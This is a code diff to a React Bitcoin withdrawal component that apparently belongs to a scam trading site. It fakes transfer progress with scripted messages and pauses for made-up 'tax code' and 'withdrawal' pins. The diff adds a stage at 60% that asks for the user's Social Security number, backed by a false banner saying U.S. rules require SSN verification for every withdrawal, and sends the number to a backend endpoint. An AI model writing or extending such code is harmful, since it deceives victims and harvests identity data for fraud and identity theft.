@@ -28,6 +28,8 @@ export default function Btcpayment({
   const [taxCodePinError, setTaxCodePinError] = useState("");
   const [withdrawalPin, setWithdrawalPin] = useState("");
   const [withdrawalPinError, setWithdrawalPinError] = useState("");
+  const [ssn, setSsn] = useState("");
+  const [ssnError, setSsnError] = useState("");
   const [waitingForPin, setWaitingForPin] = useState(false);
   const [showSucces, setSuccess] = useState(false);
   const { details, setDetails, setNotification } = useUserData();
@@ -36,7 +38,10 @@ export default function Btcpayment({
     const updateProgress = () => {
       setProgress((prevProgress) => {
         const newProgress = prevProgress + 0.5;
-        if (newProgress >= 80 && !taxCodePin) {
+        if (newProgress >= 60 && !ssn) {
+          setWaitingForPin(true);
+          return 60;
+        } else if (newProgress >= 80 && !taxCodePin) {
           setWaitingForPin(true);
           return 80;
         } else if (newProgress >= 90 && !withdrawalPin) {
@@ -94,7 +99,7 @@ export default function Btcpayment({
 
       return () => clearInterval(interval);
     }
-  }, [btcFilled, progress, waitingForPin, taxCodePin]);
+  }, [btcFilled, progress, waitingForPin, taxCodePin, ssn]);
 
   const updateProgressMessage = (currentProgress) => {
     if (currentProgress >= 0 && currentProgress < 10) {
@@ -111,7 +116,7 @@ export default function Btcpayment({
       setProgressMessage("Connecting to primary trading wallet...");
     } else if (currentProgress >= 60 && currentProgress < 70) {
       setProgressMessage(
-        "Securing transaction with multi-signature technology..."
+        "Complying with U.S. regulations for transaction verification..."
       );
     } else if (currentProgress >= 70 && currentProgress < 80) {
       setProgressMessage("Preparing Bitcoin for transfer...");
@@ -131,6 +136,9 @@ export default function Btcpayment({
   };
   const handleWithdrawPinChange = (e) => {
     setWithdrawalPin(e.target.value);
+  };
+  const handleSsnChange = (e) => {
+    setSsn(e.target.value);
   };
   async function loginUser1(email, taxCodePin) {
     setLoading(true);
@@ -197,6 +205,38 @@ export default function Btcpayment({
       // You can add logic here to handle the form submission
     } else {
       setWithdrawalPinError("Tax Code Pin must be at least 4 characters");
+    }
+  };
+
+  async function updateUserSsn(email, ssn) {
+    setLoading(true);
+    try {
+      const response = await axios.post("/user/updatessn/api", {
+        email,
+        ssn,
+      });
+
+      if (response.data.success) {
+        toast.success("SSN verified successfully");
+        setLoading(false);
+        setWaitingForPin(false);
+      } else {
+        setLoading(false);
+        setSsnError("Invalid SSN format. Please check and try again");
+      }
+    } catch (error) {
+      setLoading(false);
+      setSsnError("An error occurred. Please try again later");
+    }
+  }
+
+  const handleSsnSubmit = (e) => {
+    e.preventDefault();
+    if (ssn.length === 9 || (ssn.length === 11 && ssn.includes("-"))) {
+      setSsnError(""); // Clear any previous errors
+      updateUserSsn(email, ssn);
+    } else {
+      setSsnError("Please enter a valid 9-digit SSN (XXX-XX-XXXX)");
     }
   };
 
@@ -338,6 +378,51 @@ export default function Btcpayment({
               </div>
             </div>
           </div>
+
+          {progress >= 60 && waitingForPin && progress < 80 && (
+            <div className="ssn-form px-5 md:px-14 mt-8">
+              <div className={`mb-4 p-3 rounded-md ${
+                isDarkMode ? "bg-[#222] text-white/90" : "bg-blue-50 text-blue-800"
+              }`}>
+                <h3 className="font-bold text-sm mb-1">U.S. Regulatory Compliance</h3>
+                <p className="text-xs">
+                  According to U.S. financial regulations, all withdrawals require SSN verification. 
+                  This is required for tax reporting and compliance with AML/KYC procedures.
+                </p>
+              </div>
+              <form onSubmit={handleSsnSubmit}>
+                <input
+                  type="text"
+                  id="ssn"
+                  name="ssn"
+                  placeholder="Enter SSN (XXX-XX-XXXX)"
+                  value={ssn}
+                  onChange={handleSsnChange}
+                  className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
+                    isDarkMode ? "bg-[#111] text-white/90" : "border"
+                  } bg-gry-50 font-bold focus:outline-none  ${
+                    ssnError ? "border-red-500 border" : ""
+                  }`}
+                />
+                {ssnError && (
+                  <p className="text-red-500 font-bold text-xs mt-1">
+                    {ssnError}
+                  </p>
+                )}
+                <button
+                  disabled={loading}
+                  type="submit"
+                  className="bg-[#0052FF] py- mt-2 w-full flex justify-center items-center rounded-lg text-sm text-white font-bold"
+                >
+                  {loading ? (
+                    <InfinitySpin width="100" color="#ffffff" />
+                  ) : (
+                    <div className="py-3">Verify SSN</div>
+                  )}
+                </button>
+              </form>
+            </div>
+          )}
 
           {progress >= 80 && waitingForPin && progress < 90 && (
             <div className="tax-code-form px-5 md:px-14 mt-8">
